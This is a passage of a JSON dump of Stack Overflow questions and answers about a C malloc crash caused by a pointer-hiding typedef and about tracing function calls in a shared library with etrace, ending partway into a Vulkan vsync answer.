the file, but the value of user1.recid always returns 0 - any ideas why?   </p>\n\n<p>UPDATE:  Looks like the issue is not all implementations require a fseek() after fopen().   I obviously need an fseek(dfile,0,SEEK_END); before I do a ftell() when appending.  But if I want to read from the beginning of a text or binary file, is it also customary to place a fseek() right after fopen?  Does it vary depending upon the file type?</p>\n"}, {"tags": ["c", "struct", "crash", "malloc"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1461776563, "post_id": 36896223, "comment_id": 61356805, "body": "<code>globale = malloc(sizeof(struct_globale));</code> : <code>struct_globale</code> is type of pointer of <code>struct GLOBALE</code>. this should be <code>globale = malloc(sizeof(*globale));</code>"}, {"owner": {"reputation": 3, "user_id": 6262682, "user_type": "registered", "profile_image": "https://graph.facebook.com/1172800426072725/picture?type=large", "display_name": "Lorenzo Zuin", "link": "https://stackoverflow.com/users/6262682/lorenzo-zuin"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461777124, "post_id": 36896223, "comment_id": 61357159, "body": "Thanks, my life is yours!"}], "answers": [{"comments": [{"owner": {"reputation": 8833, "user_id": 337149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3bbd41f2b74254f902cfe20acef9030b?s=128&d=identicon&r=PG", "display_name": "August Karlstrom", "link": "https://stackoverflow.com/users/337149/august-karlstrom"}, "edited": false, "score": 0, "creation_date": 1461779258, "post_id": 36896454, "comment_id": 61358579, "body": "As I see it, &quot;hiding&quot; a pointer in a type declaration is not a problem but the error proneness of <i>malloc</i> is."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 1, "last_activity_date": 1461777041, "last_edit_date": 1461777041, "creation_date": 1461776934, "answer_id": 36896454, "question_id": 36896223, "link": "https://stackoverflow.com/questions/36896223/c-malloc-cause-a-crash/36896454#36896454", "title": "c malloc cause a crash", "body": "<p>This is a good example of why it's not a good idea to hide pointers within a <code>typedef</code>:</p>\n\n<pre><code>globale = malloc(sizeof(struct_globale));\n</code></pre>\n\n<p><code>struct_globale</code> is a typedef for <code>struct GLOBALE *</code>.  So the above allocation only allocates enough space for a pointer to <code>struct GLOBALE</code> (typically 4 or 8 bytes depending on the machine / compiler).  Since the struct is larger than this, you're writing to members that are past the memory offset of the allocated size.  This results in undefined behavior.</p>\n\n<p>You need to allocate space for the size of the struct:</p>\n\n<pre><code>globale = malloc(sizeof(struct GLOBALE));\n</code></pre>\n\n<p>Or alternaltely:</p>\n\n<pre><code>globale = malloc(sizeof(*globale));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8833, "user_id": 337149, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/3bbd41f2b74254f902cfe20acef9030b?s=128&d=identicon&r=PG", "display_name": "August Karlstrom", "link": "https://stackoverflow.com/users/337149/august-karlstrom"}, "is_accepted": false, "score": 0, "last_activity_date": 1461778999, "creation_date": 1461778999, "answer_id": 36897152, "question_id": 36896223, "link": "https://stackoverflow.com/questions/36896223/c-malloc-cause-a-crash/36897152#36897152", "title": "c malloc cause a crash", "body": "<p>The function call</p>\n\n<pre><code>malloc(sizeof(struct_globale))\n</code></pre>\n\n<p>returns only a region of memory the size of the pointer <em>struct_globale</em>, not the size of the record it refers to. Obviously, memory allocation with <em>malloc</em> and its cousins is rather error prone. However, it can be improved by introducing the following function macros:</p>\n\n<pre><code>#define NEW_ARRAY(ptr, n) (ptr) = malloc((n) * sizeof (ptr)[0])\n#define NEW(ptr) NEW_ARRAY((ptr), 1)\n</code></pre>\n\n<p>With these in place you can simply say</p>\n\n<pre><code>NEW(globale);\nNEW_ARRAY(globale-&gt;celle_usate, globale-&gt;dim_schema * globale-&gt;dim_schema);\n</code></pre>\n\n<p>etc.</p>\n"}], "owner": {"reputation": 3, "user_id": 6262682, "user_type": "registered", "profile_image": "https://graph.facebook.com/1172800426072725/picture?type=large", "display_name": "Lorenzo Zuin", "link": "https://stackoverflow.com/users/6262682/lorenzo-zuin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 607, "favorite_count": 0, "accepted_answer_id": 36896454, "answer_count": 2, "score": 0, "last_activity_date": 1461778999, "creation_date": 1461776293, "last_edit_date": 1461776588, "question_id": 36896223, "link": "https://stackoverflow.com/questions/36896223/c-malloc-cause-a-crash", "title": "c malloc cause a crash", "body": "<p>Why the 3 malloc above crashes? sometimes they work but only for (globale->dim_schema) > 10 or (globale->dim_schema) >100 </p>\n\n<pre><code>struct GLOBALE {\n\n    int dim_schema;\n    char *schema;\n    int *celle_usate;\n    char *punteggi;\n    char *percorso_aiuto;\n    struct LISTA_SOLUZIONI *soluzioni; \n};\n\ntypedef struct GLOBALE *struct_globale;\n\nvoid modalita_interattiva() {\n\n    int i;\n    char lettera;\n\n    char bonus;\n    char *parola;\n    struct_globale globale;\n    globale = malloc(sizeof(struct_globale));\n\n    if(globale == NULL) {\n\n        printf(\"Impossibile creare struct globale\\n\");\n        exit(EXIT_FAILURE);\n\n    globale-&gt;soluzioni = NULL;\n\n    do{\n        printf(\"Quanto grande e' lo schema di ruzzle che vuoi usare? (&gt;0)\\n\");\n        scanf(\"%d\", &amp;(globale-&gt;dim_schema));\n        printf(\"Dimensione: %d \\n\", globale-&gt;dim_schema);\n    }while(globale-&gt;dim_schema&lt;=0);\n\n    globale-&gt;celle_usate = malloc(globale-&gt;dim_schema * globale-&gt;dim_schema * sizeof(int)); &lt;----CRASH\n    printf(\"celle usate\\n\");\n    globale-&gt;punteggi = malloc((globale-&gt;dim_schema) * (globale-&gt;dim_schema) * sizeof(char)); &lt;----CRASH\n    printf(\"punteggi\\n\");\n    globale-&gt;schema = malloc(globale-&gt;dim_schema * globale-&gt;dim_schema * sizeof(char));&lt;----CRASH\n    printf(\"schema\\n\"); \n...etc etc\n</code></pre>\n"}, {"tags": ["c++", "c", "perl", "macros", "profiling"], "comments": [{"owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "edited": false, "score": 1, "creation_date": 1461965976, "post_id": 36896140, "comment_id": 61454297, "body": "Sympathies. Even if you find what you want, unless the program is really simple, you will get probably get a file of many Mb, mostly containing low-level stuff that doesn&#39;t tell you much. When I want to know how something works I use two methods. 1) Step Into/Over, which you looked down on, but don&#39;t. 2) Let it rip, and then hit &quot;pause&quot; or Ctrl-C to <a href=\"http://stackoverflow.com/a/378024/23771\"><i>stop it at random</i></a>. Do it a few times, each time looking at who is calling whom and why. This quickly gets you an understanding of how it spends the bulk of its time."}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "reply_to_user": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "edited": false, "score": 0, "creation_date": 1461966451, "post_id": 36896140, "comment_id": 61454480, "body": "iron mike, you&#39;re probably right. The amount of time I spent figuring out how this could work, I could have stepped into millions of functions :/... one option would be to compile with <code>-finstruction-functions</code> flag only the files which I want to see. that would ignore the lower level stuff..."}, {"owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "edited": false, "score": 0, "creation_date": 1461966632, "post_id": 36896140, "comment_id": 61454542, "body": "I&#39;m flattered, I guess :) But really, try it. Don&#39;t expect instant results. What you want to know will gradually dawn on you. I&#39;ve done it several times. If there were a better way, I and others would have found it."}, {"owner": {"reputation": 891, "user_id": 3896299, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e3660fe434b2c13e0d54e35643b3b32b?s=128&d=identicon&r=PG&f=1", "display_name": "Garland", "link": "https://stackoverflow.com/users/3896299/garland"}, "edited": false, "score": 0, "creation_date": 1461968846, "post_id": 36896140, "comment_id": 61455367, "body": "I use Boost Log and created a wrapper for it:  <a href=\"http://www.boost.org/doc/libs/1_60_0/libs/log/doc/html/index.html\" rel=\"nofollow noreferrer\">boost.org/doc/libs/1_60_0/libs/log/doc/html/index.html</a>. I created &quot;TraceIn&quot; (for function entry), &quot;TraceOut&quot; (for function exit), and other Severity Levels like &quot;Verbose&quot;, &quot;Info&quot;, &quot;Warning&quot;, and &quot;Error&quot;.  For each log entry, there are timestamp, thread ID, level, and function name added."}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "reply_to_user": {"reputation": 891, "user_id": 3896299, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e3660fe434b2c13e0d54e35643b3b32b?s=128&d=identicon&r=PG&f=1", "display_name": "Garland", "link": "https://stackoverflow.com/users/3896299/garland"}, "edited": false, "score": 0, "creation_date": 1461969350, "post_id": 36896140, "comment_id": 61455535, "body": "@gxy can you submit an answer with your solution?"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "edited": false, "score": 0, "creation_date": 1462077020, "post_id": 36896140, "comment_id": 61482638, "body": "@cross Can you be more specific with your question. The etrace utility as is works for me. The simulator you want to trace, are you compiling it because for this to work you need to be and if you&#39;re compiling it whats stoping you adding this?"}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "reply_to_user": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "edited": false, "score": 0, "creation_date": 1462099186, "post_id": 36896140, "comment_id": 61487066, "body": "@Harry wrote an update..."}, {"owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "edited": false, "score": 0, "creation_date": 1462108105, "post_id": 36896140, "comment_id": 61489665, "body": "Can you provide a sample C++ source file with a relevant Makefile that would produce minimal example of the binary that <code>etrace.pl</code> has trouble analyzing?"}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 0, "creation_date": 1462127352, "post_id": 36896140, "comment_id": 61496271, "body": "I would, but that is unfeasible as it is a complete simulation framework. But you can find all you asked here: <a href=\"https://github.com/sommer/veins\" rel=\"nofollow noreferrer\">github.com/sommer/veins</a>"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "edited": false, "score": 0, "creation_date": 1462129560, "post_id": 36896140, "comment_id": 61497056, "body": "@Cross, do you want this to work on Mac or Linux."}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "reply_to_user": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "edited": false, "score": 0, "creation_date": 1462130571, "post_id": 36896140, "comment_id": 61497366, "body": "@Harry linux would suffice atm"}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "edited": false, "score": 0, "creation_date": 1462130831, "post_id": 36896140, "comment_id": 61497456, "body": "Then I think you&#39;re all set with the Perl changes I gave."}], "answers": [{"comments": [{"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 0, "creation_date": 1462138758, "post_id": 36969008, "comment_id": 61500091, "body": "your solution sounds reasonable, and I am certain it would work in most cases... but in the case of this big project I get questions marks from the perl script. See the update."}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 2, "creation_date": 1462139435, "post_id": 36969008, "comment_id": 61500304, "body": "It&#39;s using dynamic libraries and is unable to resolve the symbols or the address offsets are wrong. You keep changing the question ie it&#39;s a moving target, if I answer your next question there&#39;ll be another question and another for the next several days. You need to understand how etrace works and get it working using both the static and dynamic methods using the crumble program. At the moment it sounds like you&#39;re trying to add something you don&#39;t understand to a program you don&#39;t understand in order to understand it."}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 0, "creation_date": 1462139855, "post_id": 36969008, "comment_id": 61500453, "body": "I agree completely with what you say... <code>note to self and others:</code> probably spending couple of hours understanding how the tool works saves much more time on trying to patch things here and there... but since the questions has got some attention it would be helpful to bring it to some conclusion"}, {"owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 0, "creation_date": 1462483070, "post_id": 36969008, "comment_id": 61667822, "body": "I accepted your answer for your efforts to solve the question. However (if you find fit) you might want to extend it to provide a definite solution."}, {"owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "reply_to_user": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "edited": false, "score": 0, "creation_date": 1462483435, "post_id": 36969008, "comment_id": 61667959, "body": "My solution worked on Linux and I also had it working on the Mac with some tweaking for underscores etc. I&#39;m not sure what else I could do."}], "tags": [], "owner": {"reputation": 10563, "user_id": 1104328, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/df0790774838286ad0d93567ae1fcf56?s=128&d=identicon&r=PG&f=1", "display_name": "Harry", "link": "https://stackoverflow.com/users/1104328/harry"}, "is_accepted": true, "score": 4, "last_activity_date": 1462483626, "last_edit_date": 1462483626, "creation_date": 1462120076, "answer_id": 36969008, "question_id": 36896140, "link": "https://stackoverflow.com/questions/36896140/how-to-use-etrace-with-a-dynamic-library-for-chronological-traceing-of-function/36969008#36969008", "title": "How to use etrace with a dynamic library for chronological traceing of function calls in C++?", "body": "<h2>Fixing the Perl Script</h2>\n\n<blockquote>\n  <p>Hexadecimal number > 0xffffffff non-portable\"</p>\n</blockquote>\n\n<p>This is a warning from <code>hex</code> because it's detecting a possibly non-portable value (something > 32bits). </p>\n\n<p>At the very top of the script, add this:</p>\n\n<pre><code>use bigint qw/hex oct/;\n</code></pre>\n\n<p>When this tool was written, I suspect the people were on 32-bit machines. You can compile the program using 32-bit with the flag <code>-m32</code>, but if you change the perl script as mentioned above you won't need to. </p>\n\n<p>Note, if you're on a Mac, you can't use <code>mknod</code> the way it's used in the script to create a pipe; you need to use <code>mkfifo</code> with no arguments instead. </p>\n\n<p>On Linux, adding the <code>bigint</code> fix above works. You then need to run both commands from the same directory, I did this using <code>example2</code>:</p>\n\n<pre><code>../src/etrace.pl crumble\n# Switch to a different terminal\n./crumble\n</code></pre>\n\n<p>and I get this on the Mac and Linux</p>\n\n<pre><code>\\-- main\n|   \\-- Crumble_make_apple_crumble\n|   |   \\-- Crumble_buy_stuff\n|   |   |   \\-- Crumble_buy\n|   |   |   \\-- Crumble_buy\n|   |   |   \\-- Crumble_buy\n|   |   |   \\-- Crumble_buy\n|   |   |   \\-- Crumble_buy\n|   |   \\-- Crumble_prepare_apples\n|   |   |   \\-- Crumble_skin_and_dice\n|   |   \\-- Crumble_mix\n|   |   \\-- Crumble_finalize\n|   |   |   \\-- Crumble_put\n|   |   |   \\-- Crumble_put\n|   |   \\-- Crumble_cook\n|   |   |   \\-- Crumble_put\n|   |   |   \\-- Crumble_bake\n</code></pre>\n\n<h2>About the Dynamic Library...</h2>\n\n<p>When you load a dynamic library, the address in the object file is not the address that will be used when running. What etrace does is take a function name from a header you specify. For example, in the case of <code>example2</code>, this would be the following:</p>\n\n<pre><code>#include \"crumble.h\"\n#define PTRACE_REFERENCE_FUNCTION Crumble_buy\n</code></pre>\n\n<p>You would then edit the makefile to make sure that the header file can be found:</p>\n\n<pre><code>CFLAGS = -g -finstrument-functions -I.\n</code></pre>\n\n<p>Note the addition of the include <code>-I.</code>. The address of the symbol from the header (in our case, <code>Crumble_buy</code>) is used to calculate the offset between the object file and the actual address; this allows the program to calculate the correct address to find the symbol.</p>\n\n<p>If you look at the output of <code>nm</code>, you get something like the following: </p>\n\n<pre><code>0000000100000960 T _Crumble_bake\n00000001000005b0 T _Crumble_buy\n0000000100000640 T _Crumble_buy_stuff\n00000001000009f0 T _Crumble_cook\n</code></pre>\n\n<p>The addresses on the left are relative, that is, at runtime, these addresses actually change. The etrace.pl program is storing these in a hash like this:</p>\n\n<pre><code>$VAR1 = {\n          '4294969696' =&gt; '_Crumble_bake',\n          '4294969424' =&gt; '_Crumble_put',\n          '4294970096' =&gt; '_main',\n          '4294969264' =&gt; '_Crumble_mix',\n          '4294970704' =&gt; '_gnu_ptrace_close',\n          '4294967296' =&gt; '__mh_execute_header',\n          '4294968752' =&gt; '_Crumble_buy',\n          '4294968896' =&gt; '_Crumble_buy_stuff',\n          '4294969952' =&gt; '_Crumble_make_apple_crumble',\n          '4294969184' =&gt; '_Crumble_prepare_apples',\n          '4294971512' =&gt; '___GNU_PTRACE_FILE__',\n          '4294971504' =&gt; '_gnu_ptrace.first',\n          '4294970208' =&gt; '_gnu_ptrace',\n          '4294970656' =&gt; '___cyg_profile_func_exit',\n          '4294970608' =&gt; '___cyg_profile_func_enter',\n          '4294969552' =&gt; '_Crumble_finalize',\n          '4294971508' =&gt; '_gnu_ptrace.active',\n          '4294969840' =&gt; '_Crumble_cook',\n          '4294969088' =&gt; '_Crumble_skin_and_dice',\n          '4294970352' =&gt; '_gnu_ptrace_init'\n        };\n</code></pre>\n\n<p>Note the leading underscore because this is on a Mac using clang. At runtime, these addresses are not correct, but their relative offsets are. If you can work out what the offset is, you can adjust the addresses you get at runtime to find the actual symbol. The code that does this follows:</p>\n\n<pre><code> if ($offsetLine =~ m/^$REFERENCE_OFFSET\\s+($SYMBOL_NAME)\\s+($HEX_NUMBER)$/) {\n    # This is a dynamic library; need to calculate the load offset\n    my $offsetSymbol  = \"_$1\";\n    my $offsetAddress = hex $2; \n\n    my %offsetTable = reverse %SYMBOLTABLE;\n\n    print Dumper(\\%offsetTable);\n    $baseAddress = $offsetTable{$offsetSymbol} - $offsetAddress;\n    #print(\"offsetSymbol == $offsetSymbol\\n\");\n    #print(\"offsetAddress == $offsetAddress\\n\");\n    #print(\"baseoffsetAddress == $offsetAddress\\n\");\n    $offsetLine = &lt;CALL_DATA&gt;;\n  } else {\n    # This is static\n    $baseAddress = 0;\n  }\n</code></pre>\n\n<p>This is what the line <code>#define PTRACE_REFERENCE_FUNCTION Crumble_buy</code> is for. The <code>C</code> code in ptrace is using that MACRO, and if defined, outputting the address of that function as the first thing. It then calculates the offset, and for all subsequent addresses, adjusts them by this amount, looking up the correct symbol in the hash.</p>\n"}], "owner": {"reputation": 950, "user_id": 4317408, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5f7519c4f04b57198ce87f657da139df?s=128&d=identicon&r=PG&f=1", "display_name": "cross", "link": "https://stackoverflow.com/users/4317408/cross"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1187, "favorite_count": 1, "accepted_answer_id": 36969008, "answer_count": 1, "score": 15, "last_activity_date": 1577750632, "creation_date": 1461776088, "last_edit_date": 1577750632, "question_id": 36896140, "link": "https://stackoverflow.com/questions/36896140/how-to-use-etrace-with-a-dynamic-library-for-chronological-traceing-of-function", "title": "How to use etrace with a dynamic library for chronological traceing of function calls in C++?", "body": "<p><strong>Background:</strong></p>\n\n<p>I have one big simulation tool, and I need to understand its logical behavior. In order to do that, the most of help I would get if I have the chronological order of function calls, for a minimal working example.</p>\n\n<p>I found many tools online, like <a href=\"http://www.logix.cz/michal/devel/CygProfiler/\" rel=\"nofollow noreferrer\">CygProfiler</a> and <a href=\"https://github.com/elcritch/etrace\" rel=\"nofollow noreferrer\">etrace</a>. I became so miserable on finding a solution that I started to follow the craziest solution of using \"step into\" with the debugger. Which is a good option if you have a small program but not a complete simulation tool.</p>\n\n<hr>\n\n<p><strong>Problem:</strong></p>\n\n<p>One of the problems I face is that the above-mentioned solutions are originally meant for <code>C</code> and they generate a static file (<code>*.o</code>) when compiled. On the other hand the simulation tool generates a shared library (<code>.so</code>). I don't have much knowledge on lower level stuff so I seem to fail when I try linking them.</p>\n\n<p>I looked specifically at the <code>etrace</code> <a href=\"https://github.com/elcritch/etrace/blob/master/README\" rel=\"nofollow noreferrer\">documentation</a>, and it says:</p>\n\n<blockquote>\n  <p>To see how to modify ptrace.c to work with a dynamic library, look at\n  the example2 directory. The sources there also create a stand-alone\n  executable, but the PTRACE_REFERENCE_FUNCTION macro is defined just as\n  it would be for a dynamic library.</p>\n</blockquote>\n\n<p>If you look at the repo there is no difference between the files in <code>example</code> and <code>example2</code> folders. Only there is an extra <code>.h</code> file in <code>example2</code>.</p>\n\n<p>On the other hand, if you look at <code>src/ptrace.c</code> there it says:</p>\n\n<blockquote>\n  <p>When using ptrace on a dynamic library, you must set the\n    PTRACE_REFERENCE_FUNCTION macro to be the name of a function in the\n    library. The address of this function when loaded will be the first\n    line output to the trace file and will permit the translation of the\n    other entry and exit pointers to their symbolic names. You may set\n    the macro PTRACE_INCLUDE with any #include directives needed for\n    that function to be accesible to this source file.</p>\n</blockquote>\n\n<p>a little below there is the commented code:</p>\n\n<pre><code>/* When using ptrace on a dynamic library, the following must be defined:\n#include \"any files needed for PTRACE_REFERENCE_FUNCTION\"\n#define PTRACE_REFERENCE_FUNCTION functionName\n`*/\n</code></pre>\n\n<hr>\n\n<p><strong>Question:</strong></p>\n\n<p>In essence the question is the following: How to use <code>etrace</code> with a dynamic library?</p>\n\n<p>Do I need to #include any files?</p>\n\n<blockquote>\n  <p>To trace a stand-alone program, there is no need to #include any\n  additional file. Just link your code against ptrace.c and use the\n  -finstrument-functions option as a compile option for gcc. This should do it.</p>\n</blockquote>\n\n<p>How do I link a C++ code which is built via makefiles against <code>ptrace.c</code></p>\n\n<p><strong>Final Note:</strong> I would appreciate if someone bears with my ignorance and provides a step-by-step solution to my question.</p>\n\n<hr>\n\n<p><strong>Update 1:</strong></p>\n\n<p>I managed to add the libraries related to etrace to the simulation tool, and it executes fine. </p>\n\n<p>However, (probably because the scripts are too old, or are not meant for use with C++) I get the following error when using the <a href=\"https://github.com/elcritch/etrace/blob/master/src/etrace.pl\" rel=\"nofollow noreferrer\">perl script</a> provided by default by <code>etrace</code></p>\n\n<blockquote>\n<pre><code>Hexadecimal number &gt; 0xffffffff non-portable\"\n</code></pre>\n</blockquote>\n\n<p>Probably this changes a bit the nature of this question, turning it more to a perl related issue at this point. </p>\n\n<p>If this problem is solved, I hope <code>etrace</code> will work with a complicated project and I will provide the details</p>\n\n<hr>\n\n<p><strong>Update 2:</strong></p>\n\n<p>I took the suggestions from @Harry, and I believe that would work in most projects. However in my case I get the following from the perl script:</p>\n\n<pre><code>Use of uninitialized value within %SYMBOLTABLE in list assignment at etrace2.pl line 99, &lt;CALL_DATA&gt; line 1.\n\n\\-- ???\n|   \\-- ???\n\\-- ???\n|   \\-- ???\n|   |   \\-- ???\n\\-- ???\n|   \\-- ???\n\\-- ???\n|   \\-- ???\n\\-- ???\n|   \\-- ???\n\\-- ???\n|   \\-- ???\n\\-- ???\n|   \\-- ???\n</code></pre>\n\n<p>Due to autegenerated makefiles I used the <a href=\"https://stackoverflow.com/a/36959597/4317408\">LD_PRELOAD</a> to load the shared library for etrace.so which I got as follows:</p>\n\n<pre><code>gcc -g -finstrument-functions -shared -fPIC ptrace.c -o etrace.so -I &lt;path-to-etrace&gt;\n</code></pre>\n\n<p>I created the dummy etrace.h inside the tool:</p>\n\n<pre><code>#ifndef __ETRACE_H_\n#define __ETRACE_H_\n\n#include &lt;stdio.h&gt;\n\nvoid Crumble_buy(char * what, int quantity, char * unit);\n\n\nvoid Crumble_buy(char * what, int quantity, char * unit)\n{\n    printf(\"buy %d %s of %s\\n\", quantity, unit, what);\n}\n\n#endif\n</code></pre>\n\n<p>and used <code>Crumble_buy</code> for the <code>#define</code> and the <code>etrace.h</code> for the <code>#include</code>.</p>\n"}, {"tags": ["c++", "c", "vsync", "vulkan"], "answers": [{"comments": [{"owner": {"reputation": 44714, "user_id": 731620, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6e2168c4647a4f096a14c254bd3d3f68?s=128&d=identicon&r=PG", "display_name": "ratchet freak", "link": "https://stackoverflow.com/users/731620/ratchet-freak"}, "edited": false, "score": 4, "creation_date": 1461841330, "post_id": 36900602, "comment_id": 61387504, "body": "FIFO is the one mode that is always available"}, {"owner": {"reputation": 3724, "user_id": 6077683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/69WTF.jpg?s=128&g=1", "display_name": "Sascha Willems", "link": "https://stackoverflow.com/users/6077683/sascha-willems"}, "reply_to_user": {"reputation": 44714, "user_id": 731620, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6e2168c4647a4f096a14c254bd3d3f68?s=128&d=identicon&r=PG", "display_name": "ratchet freak", "link": "https://stackoverflow.com/users/731620/ratchet-freak"}, "edited": false, "score": 4, "creation_date": 1461854247, "post_id": 36900602, "comment_id": 61397740, "body": "Technically yes, at is required to be supported by the specs. But you should still have a fallback and don&#39;t rely on the presence of VK_PRESENT_MODE_FIFO_KHR, e.g. if you&#39;re running on non-conformant drivers or implementations."}], "tags": [], "owner": {"reputation": 3724, "user_id": 6077683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/69WTF.jpg?s=128&g=1", "display_name": "Sascha Willems", "link": "https://stackoverflow.com/users/6077683/sascha-willems"}, "is_accepted": true, "score": 